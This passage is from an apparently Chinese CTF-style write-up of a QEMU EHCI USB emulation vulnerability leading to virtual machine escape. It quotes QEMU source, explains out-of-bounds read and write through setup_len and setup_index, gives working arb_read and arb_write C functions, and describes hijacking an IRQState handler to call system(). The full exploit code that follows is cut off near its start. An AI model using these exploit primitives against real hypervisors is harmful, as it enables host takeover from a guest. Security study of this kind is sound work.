USB_TOKEN_IN &amp;&amp; NLPTR_TBIT(p-&gt;qtd.altnext) == <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">//usb_packet_setup是为p-&gt;pid、 p-&gt;id 、p-&gt;ep赋值</span><br>        usb_packet_setup(&amp;p-&gt;packet, p-&gt;pid, ep, <span class="hljs-number">0</span>, p-&gt;qtdaddr, spd,<br>                         (p-&gt;qtd.token &amp; QTD_TOKEN_IOC) != <span class="hljs-number">0</span>);<br>        usb_packet_map(&amp;p-&gt;packet, &amp;p-&gt;sgl);<br>        p-&gt;async = EHCI_ASYNC_INITIALIZED;<br>    &#125;<br>    ………………<br>    ………………<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ehci_init_transfer中的p-&gt;qtd 来自之前ehci_state_fetchqtd函数中的<code>p-&gt;qtd = qtd</code>，这里主要将qtd.token和qtd.bufptr中的值赋值给sgl结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ehci_init_transfer</span><span class="hljs-params">(EHCIPacket *p)</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> cpage, offset, bytes, plen;<br>    <span class="hljs-type">dma_addr_t</span> page;<br><br>    cpage  = get_field(p-&gt;qtd.token, QTD_TOKEN_CPAGE);<br>    <span class="hljs-comment">//get_field 实际上就是(p-&gt;qtd.token &gt;&gt; QTD_TOKEN_TBYTES)的结果</span><br>    bytes  = get_field(p-&gt;qtd.token, QTD_TOKEN_TBYTES);<br>    offset = p-&gt;qtd.bufptr[<span class="hljs-number">0</span>] &amp; ~QTD_BUFPTR_MASK;<br>    qemu_sglist_init(&amp;p-&gt;sgl, p-&gt;<span class="hljs-built_in">queue</span>-&gt;ehci-&gt;device, <span class="hljs-number">5</span>, p-&gt;<span class="hljs-built_in">queue</span>-&gt;ehci-&gt;as);<br><br>    <span class="hljs-keyword">while</span> (bytes &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (cpage &gt; <span class="hljs-number">4</span>) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;cpage out of range (%d)\n&quot;</span>, cpage);<br>            qemu_sglist_destroy(&amp;p-&gt;sgl);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br><br>        page  = p-&gt;qtd.bufptr[cpage] &amp; QTD_BUFPTR_MASK;<br>        page += offset;<br>        plen  = bytes;<br>        <span class="hljs-keyword">if</span> (plen &gt; <span class="hljs-number">4096</span> - offset) &#123;<br>            plen = <span class="hljs-number">4096</span> - offset;<br>            offset = <span class="hljs-number">0</span>;<br>            cpage++;<br>        &#125;<br><span class="hljs-comment">// qemu_sglist_add函数的作用是为p-&gt;sgl结构体赋值，效果如下</span><br>        <span class="hljs-comment">// sgl-&gt;sg[sgl-&gt;nsg].base = page; </span><br>        <span class="hljs-comment">// sgl-&gt;sg[sgl-&gt;nsg].len = plen;</span><br>        <span class="hljs-comment">// sgl-&gt;size += len</span><br>        qemu_sglist_add(&amp;p-&gt;sgl, page, plen);<br>        bytes -= plen;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>usb_packet_map函数主要利用sgl结构体来对p-&gt;iov赋值，dma_memory_map会对<code>sgl-&gt;sg[i].base</code>这个值操作操作，说明其是物理地址，也就是说赋值给 sgl-&gt;sg[i].base的qtd.bufptr也是物理地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">usb_packet_map</span><span class="hljs-params">(USBPacket *p, QEMUSGList *sgl)</span><br>&#123;<br>    DMADirection dir = (p-&gt;pid == USB_TOKEN_IN) ?<br>        DMA_DIRECTION_FROM_DEVICE : DMA_DIRECTION_TO_DEVICE;<br>    <span class="hljs-type">void</span> *mem;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; sgl-&gt;nsg; i++) &#123;<br>        <span class="hljs-type">dma_addr_t</span> base = sgl-&gt;sg[i].base;<br>        <span class="hljs-type">dma_addr_t</span> len = sgl-&gt;sg[i].len;<br><br>        <span class="hljs-keyword">while</span> (len) &#123;<br>            <span class="hljs-type">dma_addr_t</span> xlen = len;<br>            <span class="hljs-comment">// dma_memory_map的作用是将虚拟机物理内存区域映射到qemu中的分配给虚拟机真实内存</span><br>            mem = dma_memory_map(sgl-&gt;as, base, &amp;xlen, dir);<br>            <span class="hljs-keyword">if</span> (!mem) &#123;<br>                <span class="hljs-keyword">goto</span> err;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (xlen &gt; len) &#123;<br>                xlen = len;<br>            &#125;<br>            <span class="hljs-comment">// qemu_iovec_add的作用是为p-&gt;iov结构体赋值，效果如下</span><br>            <span class="hljs-comment">// p-&gt;iov[p-&gt;niov].iov_base = mem;</span><br>   <span class="hljs-comment">// p-&gt;iov[p-&gt;niov].iov_len = xlen;</span><br>    <span class="hljs-comment">// p-&gt;size += xlen;</span><br>            qemu_iovec_add(&amp;p-&gt;iov, mem, xlen);<br>            len -= xlen;<br>            base += xlen;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err:<br>    usb_packet_unmap(p, sgl);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​                                   </p><p>至此整明白p-&gt;iov的来源以后， 就可以顺利利用漏洞了。                               </p><h2 id="识别本地的PCI设备"><a href="#识别本地的PCI设备" class="headerlink" title="识别本地的PCI设备"></a>识别本地的PCI设备</h2><p>虽然这一步和漏洞利用并没有关系，但是还有要说明一下。</p><p>使用<code>lspci</code>，显示的Class、vendor_id和device_id后的16进制数可以判断PCI设备，参数的含义可以参考：<a href="https://elixir.bootlin.com/qemu/v4.2.1/source/include/hw/pci/pci_ids.h">https://elixir.bootlin.com/qemu/v4.2.1/source/include/hw/pci/pci_ids.h</a></p><p>虽然在CTF题中目标的PCI设备可以直接通过vendor_id和device_id识别，但是对真实的环境，很多设备的初始化异常复杂，如果本地的文件系统中的<code>lspci</code>功能不全，看到不到更多的PCI设备信息，这里使用qemu的monitor功能，进入monitor模式以后输入<code>info pci</code>，就可以很容易看到详细的PCI设备信息：</p><img src="/img/21/Screenshot 2023-10-09 133124.png" style="zoom:80%;" /><p>​                              </p><p>不过对应这里的usb设备，在初始化文件系统时就已经提供了相关信息：</p><img src="/img/21/Screenshot 2023-10-09 132609.png" style="zoom:80%;" /><p>​                                                                    </p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="任意读写"><a href="#任意读写" class="headerlink" title="任意读写"></a>任意读写</h3><p>相关函数代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_token_in</span><span class="hljs-params">(USBDevice *s, USBPacket *p)</span><br>&#123;<br>    ………………<br>    ………………<br>    <span class="hljs-keyword">case</span> SETUP_STATE_DATA:<br>        <span class="hljs-keyword">if</span> (s-&gt;setup_buf[<span class="hljs-number">0</span>] &amp; USB_DIR_IN) &#123;<br>            <span class="hljs-type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;<br>            <span class="hljs-keyword">if</span> (len &gt; p-&gt;iov.size) &#123;<br>                len = p-&gt;iov.size;<br>            &#125;<br>            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);<br>            s-&gt;setup_index += len;<br>            <span class="hljs-keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;<br>                s-&gt;setup_state = SETUP_STATE_ACK;<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    ………………<br>    ………………<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_token_out</span><span class="hljs-params">(USBDevice *s, USBPacket *p)</span><br>&#123;<br>    ………………<br>    ………………<br>    <span class="hljs-keyword">case</span> SETUP_STATE_DATA:<br>        <span class="hljs-keyword">if</span> (!(s-&gt;setup_buf[<span class="hljs-number">0</span>] &amp; USB_DIR_IN)) &#123;<br>            <span class="hljs-type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;<br>            <span class="hljs-keyword">if</span> (len &gt; p-&gt;iov.size) &#123;<br>                len = p-&gt;iov.size;<br>            &#125;<br>            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);<br>            s-&gt;setup_index += len;<br>            <span class="hljs-keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;<br>                s-&gt;setup_state = SETUP_STATE_ACK;<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    ………………<br>    ………………<br>&#125;<br></code></pre></td></tr></table></figure><p>直接无脑设置s-&gt;setup_len为0xffff去越界读内存完全可行，只不过有点费内存页，但是这样去越界写的话必然会影响到内存中其它的变量，导致出错。</p><p>这里的思路是参考De4dCr0w师傅的做法，做出了一点修改：</p><ol><li>set_length先设置一个正常大小的s-&gt;setup_len，如果直接设置s-&gt;setup_len为越界的大小，直接返回后的s-&gt;setup_state没有设置为SETUP_STATE_DATA，接下来的越界写也无法完成</li><li>set_length再设置为0x1010</li><li>越界写，修改s-&gt;setup_index为((size_t)1 &lt;&lt; 32)  - 8  - 0x1010，完成越界写后有 <code>s-&gt;setup_index += len</code>，最后s-&gt;setup_index &#x3D; ((size_t)1 &lt;&lt; 32)  - 8，由于s-&gt;setup_index为int类型，这里实际是<code>-8</code>，下一步越界写就是从<code>&amp;s-&gt;data_buf - 8</code>开始，也就是从s-&gt;setup_buf开始写 ；修改s-&gt;setup_len为0x1018，让其下一步越界写也能覆盖s-&gt;setup_len和s-&gt;setup_index；同时也要修改s-&gt;setup_state为SETUP_STATE_DATA</li><li>继续越界写，修改中s-&gt;setup_buf[0]的值为USB_DIR_IN或者USB_DIR_OUT（本来就可以越界写，其实USB_DIR_OUT可以不用刻意设置），可以让接下来的do_token_in和do_token_out通过对<code>s-&gt;setup_buf[0]</code>的判断，顺利调用usb_packet_copy函数；修改s-&gt;setup_index为offset(目的偏移值) - 0x1020，<code>s-&gt;setup_index += len</code>后就是目标偏移；修改s-&gt;setup_len为(目的偏移值) + size(读写的大小)；修改s-&gt;setup_state为SETUP_STATE_DATA</li><li>修改参数时注意：<code>if (s-&gt;setup_index &gt;= s-&gt;setup_len)</code>，如果满足这个判断，越界修改的s-&gt;setup_state就会失效</li><li>最后就可以顺利通过s-&gt;setup_index来任意读写堆内存了</li></ol><p>任意读：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">arb_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> offset, <span class="hljs-type">uint32_t</span> size)</span>&#123;<br>    set_length(<span class="hljs-number">0x100</span>, USB_DIR_IN);<br>    <span class="hljs-built_in">memset</span>(data_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(data_buf_oob, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">4</span>) = SETUP_STATE_DATA;  <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">8</span>) = <span class="hljs-number">0x1018</span>;            <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = ((<span class="hljs-type">size_t</span>)<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span>)  - <span class="hljs-number">8</span>  - <span class="hljs-number">0x1010</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf) = USB_DIR_IN; <span class="hljs-comment">//为下一步的越界读设置参数</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = SETUP_STATE_DATA; <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x10</span>) = offset + size; <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x14</span>) = offset - <span class="hljs-number">0x1020</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br>    read_from_usb();<br>&#125;<br></code></pre></td></tr></table></figure><p>任意写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">arb_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> offset, <span class="hljs-type">void</span> *payload, <span class="hljs-type">uint32_t</span> payload_size)</span>&#123;<br>    set_length(<span class="hljs-number">0x100</span>, USB_DIR_IN);<br>    <span class="hljs-built_in">memset</span>(data_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(data_buf_oob, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">4</span>) = SETUP_STATE_DATA;  <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">8</span>) = <span class="hljs-number">0x1018</span>;            <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = ((<span class="hljs-type">size_t</span>)<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span>)  - <span class="hljs-number">8</span>  - <span class="hljs-number">0x1010</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf) = USB_DIR_OUT;                 <span class="hljs-comment">//为下一步的越界写设置参数</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = SETUP_STATE_DATA; <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x10</span>) = offset + payload_size; <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x14</span>) = offset - <span class="hljs-number">0x1020</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br>    <span class="hljs-built_in">memcpy</span>(data_buf, payload, payload_size);<br>    <span class="hljs-comment">//getchar();</span><br>    write_to_usb();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="整体利用"><a href="#整体利用" class="headerlink" title="整体利用"></a>整体利用</h3><p>在s-&gt;data_buf + 0x2004处就可以泄漏出堆地址和qemu地址</p><img src="/img/21/Screenshot 2023-10-10 215508.png" style="zoom:80%;" /><p>​                                  </p><p>泄漏出地址后有如下两种方法去实现逃逸</p><h4 id="修改IRQState结构体"><a href="#修改IRQState结构体" class="headerlink" title="修改IRQState结构体"></a>修改IRQState结构体</h4><p>具体调用链如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">IRQState</span> &#123;</span><br>    Object parent_obj;<br><br>    qemu_irq_handler handler;<br>    <span class="hljs-type">void</span> *opaque;<br>    <span class="hljs-type">int</span> n;<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">IRQState</span> *<span class="hljs-title">qemu_irq</span>;</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_set_irq</span><span class="hljs-params">(qemu_irq irq, <span class="hljs-type">int</span> level)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!irq)<br>        <span class="hljs-keyword">return</span>;<br><br>    irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">ehci_update_irq</span><span class="hljs-params">(EHCIState *s)</span><br>&#123;<br>    <span class="hljs-type">int</span> level = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> ((s-&gt;usbsts &amp; USBINTR_MASK) &amp; s-&gt;usbintr) &#123;<br>        level = <span class="hljs-number">1</span>;<br>    &#125;<br><br>    trace_usb_ehci_irq(level, s-&gt;frindex, s-&gt;usbsts, s-&gt;usbintr);<br>    qemu_set_irq(s-&gt;irq, level);<br>&#125;<br></code></pre></td></tr></table></figure><p>EHCIState结构体中存在qemu_irq，ehci_opreg_write函数中switch的选项是USBSTS就可以调用ehci_update_irq(s)；qemu_irq这个结构体也在堆上，找到qemu_irq这个结构体的地址后，通过任意写修改handler为system地址，修改opaque为cmd的地址。</p><p>​                                               </p><p>完整exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT  12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-type">void</span> *mmio;<br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">void</span> *buf;<br><span class="hljs-type">uint8_t</span> *setup_buf;<br><span class="hljs-type">size_t</span> *payload_buf;<br><span class="hljs-type">void</span> *data_buf;<br><span class="hljs-type">void</span> *data_buf_oob;<br><span class="hljs-type">uint32_t</span> *entry;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqh</span> * <span 